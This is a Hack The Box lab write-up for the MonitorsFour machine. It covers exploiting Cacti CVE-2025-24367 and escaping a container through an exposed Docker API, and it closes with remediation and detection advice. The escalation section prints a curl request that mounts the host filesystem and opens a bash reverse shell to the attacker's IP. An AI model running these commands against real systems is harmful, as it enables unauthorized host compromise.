---
id: HTB-2026-MONITORSFOUR
title: MonitorsFour
excerpt: Offensive security write-up.
date: '2025-12-06'
tags:
  - WRITEUP
  - HACKTHEBOX
  - WINDOWS
  - EASY
  - CACTI
  - CVE-2025-24367
  - DOCKER-ESCAPE
category: WRITEUP
platform: HACKTHEBOX
target_os: WINDOWS
difficulty: EASY
severity: LOW
icon: Terminal
author: '0x7CC'
---

# Hack The Box — MonitorsFour (Windows) Write-Up: Cacti CVE-2025-24367 RCE → Docker socket escape

## TL;DR
On **MonitorsFour**, initial access leverages cracked credentials from a database hash to exploit an authenticated graph template Remote Code Execution vulnerability in Cacti (CVE-2025-24367). Privilege escalation is achieved by exploiting an exposed writable Docker socket to mount the host filesystem and retrieve the root flag.

---

## Target
- Host: `monitorsfour.htb`
- IP: `10.129.7.62`

---

## Recon: Database credential cracking

### Nmap Scan
- **Port 80/tcp**: HTTP (hosting Cacti)
- **Port 1433/tcp**: MSSQL

We dump local database hashes and crack the MD5 hash for user `marcus`:
- Username: `marcus`
- Password: `wonderful1`

---

## Initial Foothold: Cacti Graph Template RCE (CVE-2025-24367)

Browsing to the Cacti web interface at `cacti.monitorsfour.htb`, we log in using the recovered credentials. The Cacti instance is vulnerable to CVE-2025-24367, an authenticated RCE in Graph Templates.

We run our exploit script to trigger the vulnerability:

```bash
python exploit.py -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i 10.10.15.149 -l 60001
```

The exploit succeeds and executes our reverse shell payload, spawning a terminal session inside a Docker container as user `www-data`. We locate the user flag in `/home/marcus/user.txt`.

---

## Privilege Escalation: Docker Socket Escape

Inside the container, we check for available services and local mounts. We locate a writable Docker socket exposed at `/var/run/docker.sock` (or accessible via HTTP on `192.168.65.7:2375`).

We communicate with the Docker API to deploy a privileged container that mounts the host server's root filesystem:

```bash
curl -X POST -H "Content-Type: application/json" \
  http://192.168.65.7:2375/containers/create \
  -d '{
    "Image": "docker_setup-nginx-php:latest",
    "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.15.149/60002 0>&1"],
    "HostConfig": {
      "Binds": ["/mnt/host/c:/host_root"]
    }
  }' -o response.json
```

We extract the newly created container ID and start it:

```bash
curl -X POST http://192.168.65.7:2375/containers/$new_cid/start
```

The container executes and sends a root reverse shell. We navigate to the mounted host filesystem at `/host_root/Users/Administrator/Desktop` and read the root flag.

---

## Defensive notes / remediation

### Fix
- Upgrade Cacti to patch CVE-2025-24367.
- Do not expose the Docker socket (`docker.sock`) or Docker API port internally to unprivileged containers.
- Enforce least privilege access on container filesystems and restrict host mounts.

### Monitoring / detection ideas
- Alert on incoming connections to the Docker API port (`2375`) from container networks.
- Monitor container creation queries requesting privileged execution or host directory bindings.

---

## Lessons learned
- Docker socket exposure inside containers represents a direct path to host compromise.
- Access to graph templates in network monitoring software must be strictly controlled.

---

## Appendix: Timeline summary
1. Recon -> Crack database hash to recover user `marcus` credentials.
2. Foothold -> Exploit Cacti CVE-2025-24367 to gain shell inside the container.
3. Privilege Escalation -> Abuse exposed Docker API to spawn a privileged container mounting the host root filesystem.

---
